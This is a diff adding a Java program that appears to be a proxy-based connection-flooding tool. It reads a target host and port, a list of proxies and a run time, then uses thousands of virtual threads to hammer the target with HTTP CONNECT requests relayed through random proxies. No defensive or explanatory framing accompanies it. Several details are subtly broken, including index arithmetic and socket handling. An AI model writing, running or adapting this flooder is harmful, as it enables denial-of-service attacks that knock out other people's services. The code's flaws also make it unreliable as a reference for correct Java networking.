@@ -1,0 +1,61 @@
+import java.io.BufferedReader;
+import java.io.FileReader;
+import java.net.InetSocketAddress;
+import java.net.StandardSocketOptions;
+import java.nio.ByteBuffer;
+import java.nio.channels.SocketChannel;
+import java.util.concurrent.SynchronousQueue;
+import java.util.concurrent.ThreadFactory;
+import java.util.concurrent.ThreadPoolExecutor;
+import java.util.concurrent.TimeUnit;
+
+public class Main {
+    public static void main(String[] args) {
+        try {
+            InetSocketAddress socketAddress = new InetSocketAddress(args[0], Integer.parseInt(args[1]));
+            String address = socketAddress.getAddress().getHostAddress();
+            int port = socketAddress.getPort();
+            ByteBuffer header = ByteBuffer.wrap(("CONNECT " + address + ":" + port + " HTTP/1.1" + System.lineSeparator() + System.lineSeparator() + "HOST: " + address + ":" + port + System.lineSeparator() + System.lineSeparator()).getBytes());
+            BufferedReader fileReader = new BufferedReader(new FileReader(args[2]));
+            Object[] loader = fileReader.lines().distinct().toArray();
+            InetSocketAddress[] proxies = new InetSocketAddress[(int) (loader.length - 1)];
+            for (int index = 0; index < proxies.length; index++) {
+                String line = (String) loader[index];
+                proxies[index] = new InetSocketAddress(line.split(":")[0], Integer.parseInt(line.split(":")[1]));
+            }
+            fileReader.close();
+            for (InetSocketAddress s : proxies)
+                System.out.println(s);
+            ThreadPoolExecutor threads = new ThreadPoolExecutor(1, Runtime.getRuntime().availableProcessors() * 8000, 0, TimeUnit.NANOSECONDS, new SynchronousQueue<>(), new ThreadFactory() {
+                @Override
+                public Thread newThread(Runnable runnable) {
+                    return Thread.ofVirtual().start(runnable);
+                }
+            }, (runnable, threadPoolExecutor) -> {
+
+            });
+            threads.allowCoreThreadTimeOut(false);
+            Thread.ofPlatform().start(() -> {
+                while (true)
+                    try (SocketChannel channel = SocketChannel.open()) {
+                        threads.execute(() -> {
+                            try {
+                                channel.connect(proxies[(int) (Math.random() * proxies.length - 1)]);
+                                channel.write(header.slice());
+                                channel.setOption(StandardSocketOptions.SO_LINGER, 0);
+                                channel.close();
+                            } catch (Exception exception) {
+
+                            }
+                        });
+                    } catch (Exception exception) {
+
+                    }
+            });
+            Thread.sleep(Integer.parseInt(args[3]) * 1000L);
+        } catch (Exception exception) {
+            exception.printStackTrace();
+        }
+    }
+
+}
